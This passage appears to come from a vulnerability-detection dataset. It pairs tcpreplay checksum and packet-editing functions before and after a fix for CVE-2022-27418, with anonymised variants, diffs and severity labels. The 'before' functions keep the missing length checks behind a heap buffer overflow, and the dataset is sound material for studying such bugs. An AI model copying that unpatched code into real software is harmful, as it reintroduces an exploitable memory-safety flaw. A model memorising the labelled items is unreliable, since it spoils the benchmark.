        offset += ((nhdr->ip_len + 1) << 3);
    }

    return -1;
}","static int
ipv6_header_length(ipv6_hdr_t const * VAR_0, const size_t VAR_1,
                   const size_t VAR_2)
{
    struct tcpr_ipv6_ext_hdr_base const * VAR_3;
    uint8_t VAR_4;
    int VAR_5;

    VAR_5 = sizeof(*VAR_0);
    VAR_4 = VAR_0->ip_nh;

    while (sizeof(*VAR_3) + VAR_5 + VAR_2 < (size_t)VAR_1) {
        if (VAR_4 != VAR_6
                && VAR_4 != VAR_7
                && VAR_4 != VAR_8) {
            return VAR_5;
        }

        VAR_3 = (struct tcpr_ipv6_ext_hdr_base const *) (((uint8_t const *)VAR_0) + VAR_5);
        VAR_4 = VAR_3->ip_nh;
        VAR_5 += ((VAR_3->ip_len + 1) << 3);
    }

    return -1;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/edit_packet.c/vul/after/2.json,"--- func_before
+++ func_after
@@ -1,5 +1,6 @@
 static int
-ipv6_header_length(ipv6_hdr_t const * ip6_hdr, int pkt_len)
+ipv6_header_length(ipv6_hdr_t const * ip6_hdr, const size_t pkt_len,
+                   const size_t l2len)
 {
     struct tcpr_ipv6_ext_hdr_base const * nhdr;
     uint8_t next_header;
@@ -8,8 +9,7 @@
     offset = sizeof(*ip6_hdr);
     next_header = ip6_hdr->ip_nh;
 
-    while (sizeof(*nhdr) + offset < (size_t)pkt_len)
-    {
+    while (sizeof(*nhdr) + offset + l2len < (size_t)pkt_len) {
         if (next_header != TCPR_IPV6_NH_HBH
                 && next_header != TCPR_IPV6_NH_ROUTING
                 && next_header != TCPR_IPV6_NH_FRAGMENT) {","{'deleted_lines': ['ipv6_header_length(ipv6_hdr_t const * ip6_hdr, int pkt_len)', '    while (sizeof(*nhdr) + offset < (size_t)pkt_len)', '    {'], 'added_lines': ['ipv6_header_length(ipv6_hdr_t const * ip6_hdr, const size_t pkt_len,', '                   const size_t l2len)', '    while (sizeof(*nhdr) + offset + l2len < (size_t)pkt_len) {']}",True,Tcpreplay v4.4.1 has a heap-based buffer overflow in do_checksum_math at /tcpedit/checksum.c.,7.8,HIGH,2,valid,2022-02-11T22:37:46Z,4
CVE-2022-27418,['CWE-787'],AV:N/AC:H/Au:N/C:P/I:P/A:P,0,appneta/tcpreplay,Bug #703 safeguard against corrupt packet lengths in checksum functions,e2ac765a25e902728b6d4a825358aa536e6668c2,https://github.com/appneta/tcpreplay/commit/e2ac765a25e902728b6d4a825358aa536e6668c2,src/tcpedit/edit_packet.c,fix_ipv4_checksums,"int
fix_ipv4_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr, ipv4_hdr_t *ip_hdr)
{
int ret1 = 0, ret2 = 0, ip_len;
assert(tcpedit);
assert(pkthdr);
assert(ip_hdr);
if (pkthdr->caplen < sizeof(*ip_hdr)) {
tcpedit_setwarn(tcpedit, ""caplen too small to read IPv4 header: %u"",
pkthdr->caplen);
return TCPEDIT_WARN;
}
if (ip_hdr->ip_v != 4) {
tcpedit_seterr(tcpedit, ""Invalid packet: Expected IPv4 packet: got %u"", ip_hdr->ip_v);
return TCPEDIT_ERROR;
}
if (pkthdr->caplen == pkthdr->len &&
(htons(ip_hdr->ip_off) & (IP_MF | IP_OFFMASK)) == 0) {
ip_len = (int)ntohs(ip_hdr->ip_len);
ret1 = do_checksum(tcpedit, (u_char *) ip_hdr, ip_hdr->ip_p,
ip_len - (ip_hdr->ip_hl << 2));
if (ret1 < 0)
return TCPEDIT_ERROR;
}
ip_len = (int)ntohs(ip_hdr->ip_len);
ret2 = do_checksum(tcpedit, (u_char *) ip_hdr, IPPROTO_IP, ip_len);
if (ret2 < 0)
return TCPEDIT_ERROR;
if (ret1 == TCPEDIT_WARN || ret2 == TCPEDIT_WARN)
return TCPEDIT_WARN;
return TCPEDIT_OK;
}","int
fix_ipv4_checksums(tcpedit_t *VAR_0, struct pcap_pkthdr *VAR_1, ipv4_hdr_t *VAR_2)
{
int VAR_3 = 0, VAR_4 = 0, VAR_5;
assert(VAR_0);
assert(VAR_1);
assert(VAR_2);
if (VAR_1->caplen < sizeof(*VAR_2)) {
tcpedit_setwarn(VAR_0, ""caplen too small to read IPv4 header: %u"",
VAR_1->caplen);
return VAR_6;
}
if (VAR_2->ip_v != 4) {
tcpedit_seterr(VAR_0, ""Invalid packet: Expected IPv4 packet: got %u"", VAR_2->ip_v);
return VAR_7;
}
if (VAR_1->caplen == VAR_1->len &&
(htons(VAR_2->ip_off) & (VAR_8 | VAR_9)) == 0) {
VAR_5 = (int)ntohs(VAR_2->ip_len);
VAR_3 = do_checksum(VAR_0, (u_char *) VAR_2, VAR_2->ip_p,
VAR_5 - (VAR_2->ip_hl << 2));
if (VAR_3 < 0)
return VAR_7;
}
VAR_5 = (int)ntohs(VAR_2->ip_len);
VAR_4 = do_checksum(VAR_0, (u_char *) VAR_2, VAR_10, VAR_5);
if (VAR_4 < 0)
return VAR_7;
if (VAR_3 == VAR_6 || VAR_4 == VAR_6)
return VAR_6;
return VAR_11;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/edit_packet.c/vul/before/1.json,"int
fix_ipv4_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr,
                   ipv4_hdr_t *ip_hdr, const size_t l2len)
{
    int ret1 = 0, ret2 = 0, ip_len;
    assert(tcpedit);
    assert(pkthdr);
    assert(ip_hdr);

    if (pkthdr->caplen < (sizeof(*ip_hdr) + l2len)) {
        tcpedit_setwarn(tcpedit, ""caplen too small to read IPv4 header: %u"",
                pkthdr->caplen);
        return TCPEDIT_WARN;
    }

    if (ip_hdr->ip_v != 4) {
        tcpedit_seterr(tcpedit, ""Invalid packet: Expected IPv4 packet: got %u"", ip_hdr->ip_v);
        return TCPEDIT_ERROR;
    }

    ip_len = (int)ntohs(ip_hdr->ip_len);
    /* calc the L4 checksum if we have the whole packet && not a frag or first frag */
    if (pkthdr->caplen == pkthdr->len &&
            (htons(ip_hdr->ip_off) & (IP_MF | IP_OFFMASK)) == 0) {
        if (ip_len != (int)(pkthdr->caplen - l2len)) {
            tcpedit_seterr(tcpedit,
                           ""caplen minus L2 length %u does IPv4 header length %u"",
                           pkthdr->caplen - l2len,
                           ip_len);
            return TCPEDIT_ERROR;
        }
        ret1 = do_checksum(tcpedit, (u_char*)ip_hdr, ip_hdr->ip_p,
                           ip_len - (ip_hdr->ip_hl << 2));
        if (ret1 < 0)
            return TCPEDIT_ERROR;
    }
    
    /* calc IP checksum */
    ret2 = do_checksum(tcpedit, (u_char *) ip_hdr, IPPROTO_IP, ip_len);
    if (ret2 < 0)
        return TCPEDIT_ERROR;

    /* what do we return? */
    if (ret1 == TCPEDIT_WARN || ret2 == TCPEDIT_WARN)
        return TCPEDIT_WARN;
    
    return TCPEDIT_OK;
}","int
fix_ipv4_checksums(tcpedit_t *VAR_0, struct pcap_pkthdr *VAR_1,
                   ipv4_hdr_t *VAR_2, const size_t VAR_3)
{
    int VAR_4 = 0, VAR_5 = 0, VAR_6;
    assert(VAR_0);
    assert(VAR_1);
    assert(VAR_2);

    if (VAR_1->caplen < (sizeof(*VAR_2) + VAR_3)) {
        tcpedit_setwarn(VAR_0, ""caplen too small to read IPv4 header: %u"",
                VAR_1->caplen);
        return VAR_7;
    }

    if (VAR_2->ip_v != 4) {
        tcpedit_seterr(VAR_0, ""Invalid packet: Expected IPv4 packet: got %u"", VAR_2->ip_v);
        return VAR_8;
    }

    VAR_6 = (int)ntohs(VAR_2->ip_len);
    /* COMMENT_0 */
    if (VAR_1->caplen == VAR_1->len &&
            (htons(VAR_2->ip_off) & (VAR_9 | VAR_10)) == 0) {
        if (VAR_6 != (int)(VAR_1->caplen - VAR_3)) {
            tcpedit_seterr(VAR_0,
                           ""caplen minus L2 length %u does IPv4 header length %u"",
                           VAR_1->caplen - VAR_3,
                           VAR_6);
            return VAR_8;
        }
        VAR_4 = do_checksum(VAR_0, (u_char*)VAR_2, VAR_2->ip_p,
                           VAR_6 - (VAR_2->ip_hl << 2));
        if (VAR_4 < 0)
            return VAR_8;
    }
    
    /* COMMENT_1 */
    VAR_5 = do_checksum(VAR_0, (u_char *) VAR_2, VAR_11, VAR_6);
    if (VAR_5 < 0)
        return VAR_8;

    /* COMMENT_2 */
    if (VAR_4 == VAR_7 || VAR_5 == VAR_7)
        return VAR_7;
    
    return VAR_12;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/edit_packet.c/vul/after/1.json,"--- func_before
+++ func_after
@@ -1,12 +1,13 @@
 int
-fix_ipv4_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr, ipv4_hdr_t *ip_hdr)
+fix_ipv4_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr,
+                   ipv4_hdr_t *ip_hdr, const size_t l2len)
 {
     int ret1 = 0, ret2 = 0, ip_len;
     assert(tcpedit);
     assert(pkthdr);
     assert(ip_hdr);
 
-    if (pkthdr->caplen < sizeof(*ip_hdr)) {
+    if (pkthdr->caplen < (sizeof(*ip_hdr) + l2len)) {
         tcpedit_setwarn(tcpedit, ""caplen too small to read IPv4 header: %u"",
                 pkthdr->caplen);
         return TCPEDIT_WARN;
@@ -17,18 +18,24 @@
         return TCPEDIT_ERROR;
     }
 
+    ip_len = (int)ntohs(ip_hdr->ip_len);
     /* calc the L4 checksum if we have the whole packet && not a frag or first frag */
     if (pkthdr->caplen == pkthdr->len &&
             (htons(ip_hdr->ip_off) & (IP_MF | IP_OFFMASK)) == 0) {
-        ip_len = (int)ntohs(ip_hdr->ip_len);
-        ret1 = do_checksum(tcpedit, (u_char *) ip_hdr, ip_hdr->ip_p,
-                ip_len - (ip_hdr->ip_hl << 2));
+        if (ip_len != (int)(pkthdr->caplen - l2len)) {
+            tcpedit_seterr(tcpedit,
+                           ""caplen minus L2 length %u does IPv4 header length %u"",
+                           pkthdr->caplen - l2len,
+                           ip_len);
+            return TCPEDIT_ERROR;
+        }
+        ret1 = do_checksum(tcpedit, (u_char*)ip_hdr, ip_hdr->ip_p,
+                           ip_len - (ip_hdr->ip_hl << 2));
         if (ret1 < 0)
             return TCPEDIT_ERROR;
     }
     
     /* calc IP checksum */
-    ip_len = (int)ntohs(ip_hdr->ip_len);
     ret2 = do_checksum(tcpedit, (u_char *) ip_hdr, IPPROTO_IP, ip_len);
     if (ret2 < 0)
         return TCPEDIT_ERROR;","{'deleted_lines': ['fix_ipv4_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr, ipv4_hdr_t *ip_hdr)', '    if (pkthdr->caplen < sizeof(*ip_hdr)) {', '        ip_len = (int)ntohs(ip_hdr->ip_len);', '        ret1 = do_checksum(tcpedit, (u_char *) ip_hdr, ip_hdr->ip_p,', '                ip_len - (ip_hdr->ip_hl << 2));', '    ip_len = (int)ntohs(ip_hdr->ip_len);'], 'added_lines': ['fix_ipv4_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr,', '                   ipv4_hdr_t *ip_hdr, const size_t l2len)', '    if (pkthdr->caplen < (sizeof(*ip_hdr) + l2len)) {', '    ip_len = (int)ntohs(ip_hdr->ip_len);', '        if (ip_len != (int)(pkthdr->caplen - l2len)) {', '            tcpedit_seterr(tcpedit,', '                           ""caplen minus L2 length %u does IPv4 header length %u"",', '                           pkthdr->caplen - l2len,', '                           ip_len);', '            return TCPEDIT_ERROR;', '        }', '        ret1 = do_checksum(tcpedit, (u_char*)ip_hdr, ip_hdr->ip_p,', '                           ip_len - (ip_hdr->ip_hl << 2));']}",True,Tcpreplay v4.4.1 has a heap-based buffer overflow in do_checksum_math at /tcpedit/checksum.c.,7.8,HIGH,2,valid,2022-02-11T22:37:46Z,4
CVE-2022-27418,['CWE-787'],AV:N/AC:H/Au:N/C:P/I:P/A:P,0,appneta/tcpreplay,Bug #703 safeguard against corrupt packet lengths in checksum functions,e2ac765a25e902728b6d4a825358aa536e6668c2,https://github.com/appneta/tcpreplay/commit/e2ac765a25e902728b6d4a825358aa536e6668c2,src/tcpedit/edit_packet.c,fix_ipv6_checksums,"int
fix_ipv6_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr, ipv6_hdr_t *ip6_hdr)
{
int ret = 0;
assert(tcpedit);
assert(pkthdr);
assert(ip6_hdr);
if (pkthdr->caplen < sizeof(*ip6_hdr)) {
tcpedit_setwarn(tcpedit, ""caplen too small to read IPv6 header: %u"",
pkthdr->caplen);
return TCPEDIT_WARN;
}
ipv4_hdr_t *ip_hdr = (ipv4_hdr_t*)ip6_hdr;
if (ip_hdr->ip_v != 6) {
tcpedit_seterr(tcpedit, ""Invalid packet: Expected IPv6 packet: got %u"", ip_hdr->ip_v);
return TCPEDIT_ERROR;
}
if (pkthdr->caplen == pkthdr->len) {
if (ip6_hdr->ip_len < ipv6_header_length(ip6_hdr, pkthdr->len)) {
tcpedit_setwarn(tcpedit, ""Unable to checksum IPv6 packet with invalid length %u"",
ip6_hdr->ip_len);
return TCPEDIT_WARN;
}
ret = do_checksum(tcpedit, (u_char *)ip6_hdr, ip6_hdr->ip_nh,
htons(ip6_hdr->ip_len));
if (ret < 0)
return TCPEDIT_ERROR;
}
if (ret == TCPEDIT_WARN)
return TCPEDIT_WARN;
return TCPEDIT_OK;
}","int
fix_ipv6_checksums(tcpedit_t *VAR_0, struct pcap_pkthdr *VAR_1, ipv6_hdr_t *VAR_2)
{
int VAR_3 = 0;
assert(VAR_0);
assert(VAR_1);
assert(VAR_2);
if (VAR_1->caplen < sizeof(*VAR_2)) {
tcpedit_setwarn(VAR_0, ""caplen too small to read IPv6 header: %u"",
VAR_1->caplen);
return VAR_4;
}
ipv4_hdr_t *VAR_5 = (ipv4_hdr_t*)VAR_2;
if (VAR_5->ip_v != 6) {
tcpedit_seterr(VAR_0, ""Invalid packet: Expected IPv6 packet: got %u"", VAR_5->ip_v);
return VAR_6;
}
if (VAR_1->caplen == VAR_1->len) {
if (VAR_2->ip_len < ipv6_header_length(VAR_2, VAR_1->len)) {
tcpedit_setwarn(VAR_0, ""Unable to checksum IPv6 packet with invalid length %u"",
VAR_2->ip_len);
return VAR_4;
}
VAR_3 = do_checksum(VAR_0, (u_char *)VAR_2, VAR_2->ip_nh,
htons(VAR_2->ip_len));
if (VAR_3 < 0)
return VAR_6;
}
if (VAR_3 == VAR_4)
return VAR_4;
return VAR_7;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/edit_packet.c/vul/before/0.json,"int
fix_ipv6_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr,
                   ipv6_hdr_t *ip6_hdr, const size_t l2len)
{
    int ret = 0;
    assert(tcpedit);
    assert(pkthdr);
    assert(ip6_hdr);

    if (pkthdr->caplen < (sizeof(*ip6_hdr) + l2len)) {
        tcpedit_setwarn(tcpedit, ""caplen too small to read IPv6 header: %u"",
                pkthdr->caplen);
        return TCPEDIT_WARN;
    }

    ipv4_hdr_t *ip_hdr = (ipv4_hdr_t*)ip6_hdr;
    if (ip_hdr->ip_v != 6) {
        tcpedit_seterr(tcpedit, ""Invalid packet: Expected IPv6 packet: got %u"", ip_hdr->ip_v);
        return TCPEDIT_ERROR;
    }

    /* calc the L4 checksum if we have the whole packet && not a frag or first frag */
    if (pkthdr->caplen == pkthdr->len) {
        int ip6_len = ipv6_header_length(ip6_hdr, pkthdr->len, l2len);
        if (ip6_hdr->ip_len < ip6_len) {
            tcpedit_seterr(tcpedit, ""Unable to checksum IPv6 packet with invalid length %u"",
                        ip6_hdr->ip_len);
            return TCPEDIT_ERROR;
        }
        ret = do_checksum(tcpedit, (u_char *)ip6_hdr, ip6_hdr->ip_nh,
            htons(ip6_hdr->ip_len));
        if (ret < 0)
            return TCPEDIT_ERROR;
    }

    /* what do we return? */
    if (ret == TCPEDIT_WARN)
        return TCPEDIT_WARN;

    return TCPEDIT_OK;
}","int
fix_ipv6_checksums(tcpedit_t *VAR_0, struct pcap_pkthdr *VAR_1,
                   ipv6_hdr_t *VAR_2, const size_t VAR_3)
{
    int VAR_4 = 0;
    assert(VAR_0);
    assert(VAR_1);
    assert(VAR_2);

    if (VAR_1->caplen < (sizeof(*VAR_2) + VAR_3)) {
        tcpedit_setwarn(VAR_0, ""caplen too small to read IPv6 header: %u"",
                VAR_1->caplen);
        return VAR_5;
    }

    ipv4_hdr_t *VAR_6 = (ipv4_hdr_t*)VAR_2;
    if (VAR_6->ip_v != 6) {
        tcpedit_seterr(VAR_0, ""Invalid packet: Expected IPv6 packet: got %u"", VAR_6->ip_v);
        return VAR_7;
    }

    /* COMMENT_0 */
    if (VAR_1->caplen == VAR_1->len) {
        int VAR_8 = ipv6_header_length(VAR_2, VAR_1->len, VAR_3);
        if (VAR_2->ip_len < VAR_8) {
            tcpedit_seterr(VAR_0, ""Unable to checksum IPv6 packet with invalid length %u"",
                        VAR_2->ip_len);
            return VAR_7;
        }
        VAR_4 = do_checksum(VAR_0, (u_char *)VAR_2, VAR_2->ip_nh,
            htons(VAR_2->ip_len));
        if (VAR_4 < 0)
            return VAR_7;
    }

    /* COMMENT_1 */
    if (VAR_4 == VAR_5)
        return VAR_5;

    return VAR_9;
}",appneta/tcpreplay/e2ac765a25e902728b6d4a825358aa536e6668c2/edit_packet.c/vul/after/0.json,"--- func_before
+++ func_after
@@ -1,12 +1,13 @@
 int
-fix_ipv6_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr, ipv6_hdr_t *ip6_hdr)
+fix_ipv6_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr,
+                   ipv6_hdr_t *ip6_hdr, const size_t l2len)
 {
     int ret = 0;
     assert(tcpedit);
     assert(pkthdr);
     assert(ip6_hdr);
 
-    if (pkthdr->caplen < sizeof(*ip6_hdr)) {
+    if (pkthdr->caplen < (sizeof(*ip6_hdr) + l2len)) {
         tcpedit_setwarn(tcpedit, ""caplen too small to read IPv6 header: %u"",
                 pkthdr->caplen);
         return TCPEDIT_WARN;
@@ -20,10 +21,11 @@
 
     /* calc the L4 checksum if we have the whole packet && not a frag or first frag */
     if (pkthdr->caplen == pkthdr->len) {
-        if (ip6_hdr->ip_len < ipv6_header_length(ip6_hdr, pkthdr->len)) {
-            tcpedit_setwarn(tcpedit, ""Unable to checksum IPv6 packet with invalid length %u"",
-                    ip6_hdr->ip_len);
-            return TCPEDIT_WARN;
+        int ip6_len = ipv6_header_length(ip6_hdr, pkthdr->len, l2len);
+        if (ip6_hdr->ip_len < ip6_len) {
+            tcpedit_seterr(tcpedit, ""Unable to checksum IPv6 packet with invalid length %u"",
+                        ip6_hdr->ip_len);
+            return TCPEDIT_ERROR;
         }
         ret = do_checksum(tcpedit, (u_char *)ip6_hdr, ip6_hdr->ip_nh,
             htons(ip6_hdr->ip_len));","{'deleted_lines': ['fix_ipv6_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr, ipv6_hdr_t *ip6_hdr)', '    if (pkthdr->caplen < sizeof(*ip6_hdr)) {', '        if (ip6_hdr->ip_len < ipv6_header_length(ip6_hdr, pkthdr->len)) {', '            tcpedit_setwarn(tcpedit, ""Unable to checksum IPv6 packet with invalid length %u"",', '                    ip6_hdr->ip_len);', '            return TCPEDIT_WARN;'], 'added_lines': ['fix_ipv6_checksums(tcpedit_t *tcpedit, struct pcap_pkthdr *pkthdr,', '                   ipv6_hdr_t *ip6_hdr, const size_t l2len)', '    if (pkthdr->caplen < (sizeof(*ip6_hdr) + l2len)) {', '        int ip6_len = ipv6_header_length(ip6_hdr, pkthdr->len, l2len);', '        if (ip6_hdr->ip_len < ip6_len) {', '            tcpedit_seterr(tcpedit, ""Unable to checksum IPv6 packet with invalid length %u"",', '                        ip6_hdr->ip_len);', '            return TCPEDIT_ERROR;']}",True,Tcpreplay v4.4.1 has a heap-based buffer overflow in do_checksum_math at /tcpedit/checksum.c.,7.8,HIGH,2,valid,2022-02-11T22:37:46Z,4
CVE-2022-27418,['CWE-787'],AV:N/AC:H/Au:N/C:P/I:P/A:P,0,appneta/tcpreplay,Bug #703 safeguard against corrupt packet lengths in checksum functions,e2ac765a25e902728b6d4a825358aa536e6668c2,https://github.com/appneta/tcpreplay/commit/e2ac765a25e902728b6d4a825358aa536e6668c2,src/tcpedit/tcpedit.c,tcpedit_packet,"int
tcpedit_packet(tcpedit_t *tcpedit, struct pcap_pkthdr **pkthdr,
u_char **pktdata, tcpr_dir_t direction)
{
bool fuzz_once = tcpedit->fuzz_seed != 0;
ipv4_hdr_t *ip_hdr;
ipv6_hdr_t *ip6_hdr;
arp_hdr_t *arp_hdr;
int l2len, l2proto, retval;
int dst_dlt, src_dlt, pktlen, lendiff;
int ipflags, tclass;
int needtorecalc;           
u_char *packet;
assert(tcpedit);
assert(pkthdr);
assert(*pkthdr);
assert(pktdata);
assert(*pktdata);
assert(tcpedit->validated);
packet = *pktdata;
tcpedit->runtime.packetnum++;
dbgx(3, ""packet "" COUNTER_SPEC "" caplen %d"", 
tcpedit->runtime.packetnum, (*pkthdr)->caplen);
if (tcpedit->efcs > 0 &&(*pkthdr)->len > 4) {
if ((*pkthdr)->caplen == (*pkthdr)->len) {
(*pkthdr)->caplen -= 4;
}
(*pkthdr)->len -= 4;
}
src_dlt = tcpedit_dlt_src(tcpedit->dlt_ctx);
needtorecalc = 0;
again:
ip_hdr = NULL;
ip6_hdr = NULL;
arp_hdr = NULL;
retval = 0;
ipflags = 0;
tclass = 0;
if ((l2proto = tcpedit_dlt_proto(tcpedit->dlt_ctx, src_dlt, packet, (*pkthdr)->caplen)) < 0) {
dbgx(2, ""Packet has no L3+ header: %s"", tcpedit_geterr(tcpedit));
return TCPEDIT_SOFT_ERROR;
} else {
dbgx(2, ""Layer 3 protocol type is: 0x%04x"", ntohs(l2proto));
}
if ((pktlen = tcpedit_dlt_process(tcpedit->dlt_ctx, pktdata, (*pkthdr)->caplen, direction)) < 0) {
dbgx(3, ""Failed to edit DLT: %s"", tcpedit_geterr(tcpedit));
return TCPEDIT_SOFT_ERROR;
}
lendiff = pktlen - (*pkthdr)->caplen;
(*pkthdr)->caplen += lendiff;
(*pkthdr)->len += lendiff;
dst_dlt = tcpedit_dlt_dst(tcpedit->dlt_ctx);
l2len = tcpedit_dlt_l2len(tcpedit->dlt_ctx, dst_dlt, packet, (*pkthdr)->caplen);
if (l2len == -1)
return TCPEDIT_SOFT_ERROR;
dbgx(2, ""dst_dlt = %04x\tsrc_dlt = %04x\tproto = %04x\tl2len = %d"", dst_dlt, src_dlt, ntohs(l2proto), l2len);
if (l2proto == htons(ETHERTYPE_IP)) {
u_char *p;
if ((*pkthdr)->caplen < l2len + sizeof(*ip_hdr)) {
tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain a layer IP header for DLT 0x%04x"",
pktlen, dst_dlt);
return TCPEDIT_SOFT_ERROR;
}
ip_hdr = (ipv4_hdr_t *)tcpedit_dlt_l3data(tcpedit->dlt_ctx, dst_dlt, packet, (*pkthdr)->caplen);
if (ip_hdr == NULL)
return TCPEDIT_SOFT_ERROR;
p = get_layer4_v4(ip_hdr, (*pkthdr)->caplen - l2len);
if (!p) {
tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain a layer %d byte IP header for DLT 0x%04x"",
pktlen, ip_hdr->ip_hl << 2,  dst_dlt);
return TCPEDIT_SOFT_ERROR;
}
dbgx(3, ""Packet has an IPv4 header: 0x%p..."", ip_hdr);
} else if (l2proto == htons(ETHERTYPE_IP6)) {
u_char *p;
if ((*pkthdr)->caplen < l2len + sizeof(*ip6_hdr)) {
tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain a layer IPv6 header for DLT 0x%04x"",
pktlen, dst_dlt);
return TCPEDIT_SOFT_ERROR;
}
ip6_hdr = (ipv6_hdr_t *)tcpedit_dlt_l3data(tcpedit->dlt_ctx, dst_dlt, packet, (*pkthdr)->caplen);
if (ip6_hdr == NULL)
return TCPEDIT_SOFT_ERROR;
p = get_layer4_v6(ip6_hdr, (*pkthdr)->caplen - l2len);
if (!p) {
tcpedit_seterr(tcpedit, ""Packet length %d is too short to contain an IPv6 header for DLT 0x%04x"",
pktlen, dst_dlt);
return TCPEDIT_SOFT_ERROR;
}
dbgx(3, ""Packet has an IPv6 header: 0x%p..."", ip6_hdr);
} else {
dbgx(3, ""Packet isn't IPv4 or IPv6: 0x%04x"", l2proto);
ip_hdr = NULL;
ip6_hdr = NULL;
}
if (ip_hdr != NULL) {
if (tcpedit->tos > -1) {
volatile uint16_t oldval = *((uint16_t*)ip_hdr);
volatile uint16_t newval;
ip_hdr->ip_tos = tcpedit->tos;
newval = *((uint16_t*)ip_hdr);
csum_replace2(&ip_hdr->ip_sum, oldval, newval);
}
needtorecalc += rewrite_ipv4_ttl(tcpedit, ip_hdr);
if (tcpedit->portmap != NULL) {
if ((retval = rewrite_ipv4_ports(tcpedit, &ip_hdr,
(*pkthdr)->caplen - l2len)) < 0)
return TCPEDIT_ERROR;
needtorecalc += retval;
}
if (tcpedit->tcp_sequence_enable)
rewrite_ipv4_tcp_sequence(tcpedit, &ip_hdr,
(*pkthdr)->caplen - l2len);
}
else if (ip6_hdr != NULL) {
needtorecalc += rewrite_ipv6_hlim(tcpedit, ip6_hdr);
if (tcpedit->tclass > -1) {
tclass = tcpedit->tclass << 20;
memcpy(&ipflags, &ip6_hdr->ip_flags, 4);
ipflags = ntohl(ipflags) & 0xf00fffff;
ipflags += tclass; 
ipflags = htonl(ipflags);
memcpy(&ip6_hdr->ip_flags, &ipflags, 4);
}
if (tcpedit->flowlabel > -1) {
memcpy(&ipflags, &ip6_hdr->ip_flags, 4);
ipflags = ntohl(ipflags) & 0xfff00000;
ipflags += tcpedit->flowlabel;
ipflags = htonl(ipflags);
memcpy(&ip6_hdr->ip_flags, &ipflags, 4);
}
if (tcpedit->portmap != NULL) {
if ((retval = rewrite_ipv6_ports(tcpedit, &ip6_hdr,
(*pkthdr)->caplen - l2len)) < 0)
return TCPEDIT_ERROR;
needtorecalc += retval;
}
if (tcpedit->tcp_sequence_enable)
rewrite_ipv6_tcp_sequence(tcpedit, &ip6_hdr, (*pkthdr)->caplen - l2len);
}
if (fuzz_once) {
fuzz_once = false;
retval = fuzzing(tcpedit, *pkthdr, pktdata);
if (retval < 0) {
return TCPEDIT_ERROR;
}
needtorecalc += retval;
goto again;
}
if (tcpedit->fixlen || tcpedit->mtu_truncate) {
if ((retval = untrunc_packet(tcpedit, *pkthdr, pktdata, ip_hdr, ip6_hdr)) < 0)
return TCPEDIT_ERROR;
needtorecalc += retval;
}
if (tcpedit->rewrite_ip) {
if (ip_hdr != NULL) {
if ((retval = rewrite_ipv4l3(tcpedit, ip_hdr, direction,
(*pkthdr)->caplen - l2len)) < 0)
return TCPEDIT_ERROR;
needtorecalc += retval;
} else if (ip6_hdr != NULL) {
if ((retval = rewrite_ipv6l3(tcpedit, ip6_hdr, direction,
(*pkthdr)->caplen - l2len)) < 0)
return TCPEDIT_ERROR;
needtorecalc += retval;
}
else if (l2proto == htons(ETHERTYPE_ARP)) {
arp_hdr = (arp_hdr_t *)&(packet[l2len]);
if (rewrite_iparp(tcpedit, arp_hdr, direction) < 0)
return TCPEDIT_ERROR;
}
}
if (tcpedit->seed) {
if (ip_hdr != NULL) {
if ((retval = randomize_ipv4(tcpedit, *pkthdr, packet, 
ip_hdr, (*pkthdr)->caplen - l2len)) < 0)
return TCPEDIT_ERROR;
needtorecalc += retval;
} else if (ip6_hdr != NULL) {
if ((retval = randomize_ipv6(tcpedit, *pkthdr, packet,
ip6_hdr, (*pkthdr)->caplen - l2len)) < 0)
return TCPEDIT_ERROR;
needtorecalc += retval;
} else if (l2proto == htons(ETHERTYPE_ARP)) {
if (direction == TCPR_DIR_C2S) {
if (randomize_iparp(tcpedit, *pkthdr, packet, 
tcpedit->runtime.dlt1, (*pkthdr)->caplen - l2len) < 0)
return TCPEDIT_ERROR;
} else {
if (randomize_iparp(tcpedit, *pkthdr, packet, 
tcpedit->runtime.dlt2, (*pkthdr)->caplen - l2len) < 0)
return TCPEDIT_ERROR;
}
}
}
if ((tcpedit->fixcsum || needtorecalc)) {
if (ip_hdr != NULL) {
dbgx(3, ""doing IPv4 checksum: needtorecalc=%d"", needtorecalc);
retval = fix_ipv4_checksums(tcpedit, *pkthdr, ip_hdr);
} else if (ip6_hdr != NULL) {
dbgx(3, ""doing IPv6 checksum: needtorecalc=%d"", needtorecalc);
retval = fix_ipv6_checksums(tcpedit, *pkthdr, ip6_hdr);
} else {
dbgx(3, ""checksum not performed: needtorecalc=%d"", needtorecalc);
retval = TCPEDIT_OK;
}
if (retval < 0) {
return TCPEDIT_ERROR;
} else if (retval == TCPEDIT_WARN) {
warnx(""%s"", tcpedit_getwarn(tcpedit));
}
}
tcpedit_dlt_merge_l3data(tcpedit->dlt_ctx,
dst_dlt, packet,
(*pkthdr)->caplen,
(u_char*)ip_hdr,
(u_char*)ip6_hdr);
tcpedit->runtime.total_bytes += (*pkthdr)->caplen;
tcpedit->runtime.pkts_edited ++;
return retval;
}","int
tcpedit_packet(tcpedit_t *VAR_0, struct pcap_pkthdr **VAR_1,
u_char **VAR_2, tcpr_dir_t VAR_3)
{
bool VAR_4 = VAR_0->fuzz_seed != 0;
ipv4_hdr_t *VAR_5;
ipv6_hdr_t *VAR_6;
arp_hdr_t *VAR_7;
int VAR_8, VAR_9, VAR_10;
int VAR_11, VAR_12, VAR_13, VAR_14;
int VAR_15, VAR_16;
int VAR_17;           
u_char *VAR_18;
assert(VAR_0);
assert(VAR_1);
assert(*VAR_1);
assert(VAR_2);
assert(*VAR_2);
assert(VAR_0->validated);
VAR_18 = *VAR_2;
